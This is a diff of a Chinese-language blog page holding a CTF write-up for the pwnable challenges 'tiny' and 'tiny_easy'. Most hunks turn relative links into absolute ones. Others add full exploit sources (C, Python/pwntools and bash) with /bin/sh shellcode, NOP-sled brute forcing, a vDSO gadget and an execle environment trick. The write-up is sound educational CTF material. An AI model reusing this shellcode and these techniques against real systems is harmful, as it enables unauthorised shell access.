@@ -18,7 +18,7 @@
 
 <meta name="twitter:card" content="summary">
 <!--
-   -<meta name="twitter:image" content="/images/">
+   -<meta name="twitter:image" content="https://cubarco.org/images/">
    -->
 
 <!-- Open Graph -->
@@ -26,7 +26,7 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="Writeup-Pwnable: tiny &amp; tiny_easy">
 <meta property="og:description" content="tiny_easy 1. Brute force 这题的 bin 拿到之后开 gdb 看了一下 mapping, 发现 stack 是可执行的(如果 ELF 没有 GNU_STACK 这个 header, 则默认 stack 可执行1)。所以思路很明显了。 看一下反汇编: 8048054: 58 pop %eax 8048055: 5a pop %edx 8048056: 8b12 mov (%edx),%edx 8048058: ffd2 call *%edx 然后用 gdb 断在 entry point, 观察一下栈: $ gdb tiny_easy (gdb) b *0x8048054 Breakpoint 1 at 0x8048054 (gdb) r Starting program: /home/tiny_easy/tiny_easy Breakpoint 1, 0x08048054 in ?? () (gdb) x/32wx $esp 0xffd82d70: 0x00000001 0xffd84df5 0x00000000 0xffd84e0f 0xffd82d80: 0xffd84e1f...">
-<meta property="og:url" content="/blog/2015/12/writeup-pwnable-tiny-and-tiny-easy/">
+<meta property="og:url" content="https://cubarco.org/blog/2015/12/writeup-pwnable-tiny-and-tiny-easy/">
 <meta property="og:site_name" content="盘子里的部落格">
 
 
@@ -34,8 +34,8 @@
 
 
 
-<link rel="canonical" href="/blog/2015/12/writeup-pwnable-tiny-and-tiny-easy/">
-<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="盘子里的部落格 Feed">
+<link rel="canonical" href="https://cubarco.org/blog/2015/12/writeup-pwnable-tiny-and-tiny-easy/">
+<link href="https://cubarco.org/feed.xml" type="application/atom+xml" rel="alternate" title="盘子里的部落格 Feed">
 <link rel="author" href="http://plus.google.com/+%E6%9E%97%E5%AE%B6%E5%86%9BCube?rel=author">
 
 <!-- http://t.co/dKP3o1e -->
@@ -44,7 +44,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <!-- For all browsers -->
-<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cubarco.org/assets/css/main.css">
 
 <!--Webfonts-->
 <link href="//fonts.googleapis.com/css?family=Volkhov%7CCabin" rel="stylesheet" type="text/css">
@@ -57,8 +57,8 @@
 
 <!-- HTML5 Shiv and Media Query Support -->
 <!--[if lt IE 9]>
-  <script src="/assets/js/vendor/html5shiv.min.js"></script>
-  <script src="/assets/js/vendor/respond.min.js"></script>
+  <script src="https://cubarco.org/assets/js/vendor/html5shiv.min.js"></script>
+  <script src="https://cubarco.org/assets/js/vendor/respond.min.js"></script>
 <![endif]-->
 
 <!-- Modernizr -->
@@ -67,36 +67,36 @@
 <!-- Icons -->
 <!--
    -[> 16x16 <]
-   -<link rel="shortcut icon" href="/favicon-16x16.ico">
+   -<link rel="shortcut icon" href="https://cubarco.org/favicon-16x16.ico">
    -[> 32x32 <]
-   -<link rel="shortcut icon" href="/favicon-32x32.ico">
+   -<link rel="shortcut icon" href="https://cubarco.org/favicon-32x32.ico">
    -[> 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices <]
-   -<link rel="apple-touch-icon-precomposed" href="/images/apple-touch-icon-precomposed.png">
+   -<link rel="apple-touch-icon-precomposed" href="https://cubarco.org/images/apple-touch-icon-precomposed.png">
    -[> 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini <]
-   -<link rel="apple-touch-icon-precomposed" sizes="72x72" href="/images/apple-touch-icon-72x72-precomposed.png">
+   -<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://cubarco.org/images/apple-touch-icon-72x72-precomposed.png">
    -[> 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch <]
-   -<link rel="apple-touch-icon-precomposed" sizes="114x114" href="/images/apple-touch-icon-114x114-precomposed.png">
+   -<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://cubarco.org/images/apple-touch-icon-114x114-precomposed.png">
    -[> 144x144 (precomposed) for iPad 3rd and 4th generation <]
-   -<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/images/apple-touch-icon-144x144-precomposed.png">
+   -<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://cubarco.org/images/apple-touch-icon-144x144-precomposed.png">
    -->
-<link rel="shortcut icon" href="/favicon.ico">
-<link rel="apple-touch-icon" sizes="57x57" href="/images/favicons/apple-touch-icon-57x57.png">
-<link rel="apple-touch-icon" sizes="60x60" href="/images/favicons/apple-touch-icon-60x60.png">
-<link rel="apple-touch-icon" sizes="72x72" href="/images/favicons/apple-touch-icon-72x72.png">
-<link rel="apple-touch-icon" sizes="76x76" href="/images/favicons/apple-touch-icon-76x76.png">
-<link rel="apple-touch-icon" sizes="114x114" href="/images/favicons/apple-touch-icon-114x114.png">
-<link rel="apple-touch-icon" sizes="120x120" href="/images/favicons/apple-touch-icon-120x120.png">
-<link rel="apple-touch-icon" sizes="144x144" href="/images/favicons/apple-touch-icon-144x144.png">
-<link rel="apple-touch-icon" sizes="152x152" href="/images/favicons/apple-touch-icon-152x152.png">
-<link rel="apple-touch-icon" sizes="180x180" href="/images/favicons/apple-touch-icon-180x180.png">
-<link rel="icon" type="image/png" href="/images/favicons/android-chrome-192x192.png" sizes="192x192">
-<link rel="icon" type="image/png" href="/images/favicons/favicon-32x32.png" sizes="32x32">
-<link rel="icon" type="image/png" href="/images/favicons/favicon-96x96.png" sizes="96x96">
-<link rel="icon" type="image/png" href="/images/favicons/favicon-16x16.png" sizes="16x16">
+<link rel="shortcut icon" href="https://cubarco.org/favicon.ico">
+<link rel="apple-touch-icon" sizes="57x57" href="https://cubarco.org/images/favicons/apple-touch-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="60x60" href="https://cubarco.org/images/favicons/apple-touch-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="72x72" href="https://cubarco.org/images/favicons/apple-touch-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="76x76" href="https://cubarco.org/images/favicons/apple-touch-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="114x114" href="https://cubarco.org/images/favicons/apple-touch-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="120x120" href="https://cubarco.org/images/favicons/apple-touch-icon-120x120.png">
+<link rel="apple-touch-icon" sizes="144x144" href="https://cubarco.org/images/favicons/apple-touch-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="152x152" href="https://cubarco.org/images/favicons/apple-touch-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="https://cubarco.org/images/favicons/apple-touch-icon-180x180.png">
+<link rel="icon" type="image/png" href="https://cubarco.org/images/favicons/android-chrome-192x192.png" sizes="192x192">
+<link rel="icon" type="image/png" href="https://cubarco.org/images/favicons/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="https://cubarco.org/images/favicons/favicon-96x96.png" sizes="96x96">
+<link rel="icon" type="image/png" href="https://cubarco.org/images/favicons/favicon-16x16.png" sizes="16x16">
 
 
 <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
-<script>window.jQuery || document.write('<script src="/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
+<script>window.jQuery || document.write('<script src="https://cubarco.org/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
 <script src="/assets/js/gist-async.min.js"></script>
 
 </head>
@@ -108,19 +108,19 @@
 	    <ul>
       
 		    
-		    <li><a href="/blog/">Latest</a></li>
+		    <li><a href="https://cubarco.org/blog/">Latest</a></li>
 		  
 		    
-		    <li><a href="/blog/about/">About</a></li>
+		    <li><a href="https://cubarco.org/blog/about/">About</a></li>
 		  
 		    
-		    <li><a href="/blog/category/blog/">Blog</a></li>
+		    <li><a href="https://cubarco.org/blog/category/blog/">Blog</a></li>
 		  
 		    
-		    <li><a href="/blog/category/notes/">Notes</a></li>
+		    <li><a href="https://cubarco.org/blog/category/notes/">Notes</a></li>
 		  
 		    
-		    <li><a href="/blog/tags/">Tags</a></li>
+		    <li><a href="https://cubarco.org/blog/tags/">Tags</a></li>
 		  
         <li class="dosearch"><span><i class="fa fa-search"></i> Search</span></li>
 	    </ul>
@@ -144,7 +144,7 @@
 <header class="masthead">
 	<div class="wrap">
         
-        <h1 class="site-title animated fadeIn"><a href="">盘子里的部落格</a></h1>
+        <h1 class="site-title animated fadeIn"><a href="https://cubarco.org">盘子里的部落格</a></h1>
 		<h2 class="site-description animated fadeIn" itemprop="description">Yet another Jekyll blog.</h2>
 	</div>
 </header><!-- /.masthead -->
@@ -156,7 +156,7 @@
     
     <div class="entry-wrapper">
       <header class="entry-header">
-        <span class="entry-tags"><a href="/blog/tags/#Hack" title="Pages tagged Hack">Hack</a> • <a href="/blog/tags/#CTF" title="Pages tagged CTF">CTF</a> • <a href="/blog/tags/#Writeup" title="Pages tagged Writeup">Writeup</a> • <a href="/blog/tags/#Exploitation" title="Pages tagged Exploitation">Exploitation</a> • <a href="/blog/tags/#ROP" title="Pages tagged ROP">ROP</a></span>
+        <span class="entry-tags"><a href="https://cubarco.org/blog/tags/#Hack" title="Pages tagged Hack">Hack</a> • <a href="https://cubarco.org/blog/tags/#CTF" title="Pages tagged CTF">CTF</a> • <a href="https://cubarco.org/blog/tags/#Writeup" title="Pages tagged Writeup">Writeup</a> • <a href="https://cubarco.org/blog/tags/#Exploitation" title="Pages tagged Exploitation">Exploitation</a> • <a href="https://cubarco.org/blog/tags/#ROP" title="Pages tagged ROP">ROP</a></span>
         
           <h1 class="entry-title">Writeup-Pwnable: tiny &amp; tiny_easy</h1>
         
@@ -164,20 +164,20 @@
       <footer class="entry-meta">
         
         
-          <img src="/images/matrix.png" class="bio-photo" alt="Cubarco bio photo">
+          <img src="https://cubarco.org/images/matrix.png" class="bio-photo" alt="Cubarco bio photo">
         
         <span class="author vcard">By <span class="fn">Cubarco</span></span>
         <span class="entry-date date published"><time datetime="2015-12-11T00:00:00+08:00"><i class="fa fa-calendar-o"></i> December 11, 2015</time></span>
         
         <span class="entry-comments"><i class="fa fa-comment-o"></i> <a href="#disqus_thread">Comment</a></span>
         <span class="social-share-twitter">
-  <a href="https://twitter.com/intent/tweet?hashtags=Hack,CTF,Writeup,Exploitation,ROP&amp;text=Writeup-Pwnable:%20tiny%20&amp;%20tiny_easy&amp;url=/blog/2015/12/writeup-pwnable-tiny-and-tiny-easy/&amp;via=Cube_Lin" title="Share on Twitter" itemprop="Twitter"><i class="fa fa-twitter-square"></i> Tweet</a>
+  <a href="https://twitter.com/intent/tweet?hashtags=Hack,CTF,Writeup,Exploitation,ROP&amp;text=Writeup-Pwnable:%20tiny%20&amp;%20tiny_easy&amp;url=https://cubarco.org/blog/2015/12/writeup-pwnable-tiny-and-tiny-easy/&amp;via=Cube_Lin" title="Share on Twitter" itemprop="Twitter"><i class="fa fa-twitter-square"></i> Tweet</a>
 </span>
 <span class="social-share-facebook">
-  <a href="https://www.facebook.com/sharer/sharer.php?u=/blog/2015/12/writeup-pwnable-tiny-and-tiny-easy/" title="Share on Facebook" itemprop="Facebook"><i class="fa fa-facebook-square"></i> Like</a>
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https://cubarco.org/blog/2015/12/writeup-pwnable-tiny-and-tiny-easy/" title="Share on Facebook" itemprop="Facebook"><i class="fa fa-facebook-square"></i> Like</a>
 </span>
 <span class="social-share-googleplus">
-  <a href="https://plus.google.com/share?url=/blog/2015/12/writeup-pwnable-tiny-and-tiny-easy/" title="Share on Google Plus" itemprop="GooglePlus"><i class="fa fa-google-plus-square"></i> +1</a>
+  <a href="https://plus.google.com/share?url=https://cubarco.org/blog/2015/12/writeup-pwnable-tiny-and-tiny-easy/" title="Share on Google Plus" itemprop="GooglePlus"><i class="fa fa-google-plus-square"></i> +1</a>
 </span>
 <!-- /.social-share -->
         
@@ -220,6 +220,36 @@ Breakpoint 1, 0x08048054 in ?? ()
 
 <h6 id="exptinyeasyc">exp.tiny_easy.c</h6>
 
+<noscript><pre>#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/wait.h&gt;
+
+char *shellcode = \
+     "\xeb\x16\x5e\x31\xd2\x52\x56\x89\xe1\x89\xf3\x31\xc0\xb0\x0b\xcd"
+     "\x80\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69"
+     "\x6e\x2f\x73\x68";
+
+int main()
+{
+    char arg[130001];
+    int status;
+    memset(arg, '\x90', 130000);
+    strcpy(arg + 130000 - strlen(shellcode), shellcode);
+
+    for (;;) {
+        if (0 == fork())
+            execl("/home/tiny_easy/tiny_easy", "\xe0\xf0\x7c\xff",
+                    arg, arg, arg, arg, arg, arg, arg, arg,
+                    arg, arg, arg, arg, arg, arg, arg, arg,
+                    NULL);
+        wait(&amp;status);
+        if (WIFEXITED(status))
+            break;
+    }
+
+    return 0;
+}</pre></noscript>
 <div class="gist" data-gist="cubarco/03fb090852a3303f58db" data-gist-file="pwnable-rookiss-tiny-easy.c">Loading gist...</div>
 
 <h4 id="vdso2">2. vDSO<sup id="fnref:2"><a href="#fn:2" class="footnote">2</a></sup>
@@ -231,6 +261,22 @@ Breakpoint 1, 0x08048054 in ?? ()
 
 <h6 id="exptinyeasypy">exp.tiny_easy.py</h6>
 
+<noscript><pre>#!/usr/bin/env python
+# coding=utf8
+
+from pwn import p32, process
+
+pop_ret = 0x55557b62  # "pop ecx; ret" from vdso
+
+shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73"
+             "\x68\x68\x2f\x62\x69\x6e\x89"
+             "\xe3\x89\xc1\x89\xc2\xb0\x0b"
+             "\xcd\x80\x31\xc0\x40\xcd\x80")
+
+argv = [p32(pop_ret), shellcode]
+
+p = process(argv, executable='/home/tiny_easy/tiny_easy')
+p.interactive()</pre></noscript>
 <div class="gist" data-gist="cubarco/03fb090852a3303f58db" data-gist-file="pwnable-rookiss-tiny-easy.py">Loading gist...</div>
 
 <h2 id="tiny">tiny</h2>
@@ -263,6 +309,33 @@ Breakpoint 1, 0x08048054 in ?? ()
 <h6 id="exptinysh">exp.tiny.sh</h6>
 <p>这个 exp 的核心是 C (其实就是一句<code class="highlighter-rouge">execle()</code>的事情), 用 shell 写只是为了方便，可以把<code class="highlighter-rouge">ulimit -s unlimited</code>这些命令放在一起(调试过程中还用到了其他命令，最后删的只剩 ulimit…)，而且用一个脚本解题本身是一件很酷的事情XD.</p>
 
+<noscript><pre>#!/usr/bin/env bash
+
+tempfile=$(mktemp -d)
+echo $tempfile
+cd $tempfile
+
+gcc -xc - -oexp &lt;&lt;\EOF
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+
+int main()
+{
+    char *envp[] = {
+        "env1=1", "env2=2", "env3=3",
+        "/bin/sh", "env5=5", NULL
+    };
+    execle("/home/tiny/tiny", "\xc8\x75\x55\x55",
+           "A", "A", "A", "A", "A", "A",
+           "A", "A", "A", "A", NULL, envp);
+
+    return 0;
+}
+EOF
+
+ulimit -s unlimited
+
+exec ./exp</pre></noscript>
 <div class="gist" data-gist="cubarco/d379e31c9487c8ee07f2" data-gist-file="pwnable-hackerssecret-tiny.sh">Loading gist...</div>
 
 <h2 id="references">References</h2>
@@ -289,10 +362,10 @@ Breakpoint 1, 0x08048054 in ?? ()
         </div>
         <nav class="pagination" role="navigation">
             
-              <a href="/blog/2015/12/seccon-ctf-writeup-fsb-treewalker/" class="btn" title="Writeup-Seccon CTF: FSB:TreeWalker">Previous</a>
+              <a href="https://cubarco.org/blog/2015/12/seccon-ctf-writeup-fsb-treewalker/" class="btn" title="Writeup-Seccon CTF: FSB:TreeWalker">Previous</a>
             
             
-              <a href="/blog/2015/12/writeup-pwnable-syscall/" class="btn" title="Writeup-Pwnable: syscall">Next</a>
+              <a href="https://cubarco.org/blog/2015/12/writeup-pwnable-syscall/" class="btn" title="Writeup-Pwnable: syscall">Next</a>
             
         </nav><!-- /.pagination -->
         <div id="disqus_thread"></div>
@@ -321,7 +394,7 @@ Breakpoint 1, 0x08048054 in ?? ()
 	
 	<a href="http://github.com/cubarco" title="Cubarco on Github" target="_blank"><i class="fa fa-github-square fa-2x"></i></a>
 	
-  <a href="/feed.xml" title="Atom/RSS feed"><i class="fa fa-rss-square fa-2x"></i></a>
+  <a href="https://cubarco.org/feed.xml" title="Atom/RSS feed"><i class="fa fa-rss-square fa-2x"></i></a>
 </div>
 <!-- /.social-icons -->
 
@@ -329,13 +402,13 @@ Breakpoint 1, 0x08048054 in ?? ()
 </div>
 <!-- /.footer-wrapper -->
 
-<script src="/assets/js/scripts.min.js"></script>
+<script src="https://cubarco.org/assets/js/scripts.min.js"></script>
 
 <!-- Jekyll Simple Search option -->
 <script>
   $(document).ready(function() {
       $('.search-field').jekyllSearch({
-          jsonFile: '/search.json',
+          jsonFile: 'https://cubarco.org/search.json',
           searchResults: '.search-results',
           template: '<li><article><a href="{url}">{title} <span class="entry-date"><time datetime="{date}">{shortdate}</time></span></a></article></li>',
           fuzzy: true,
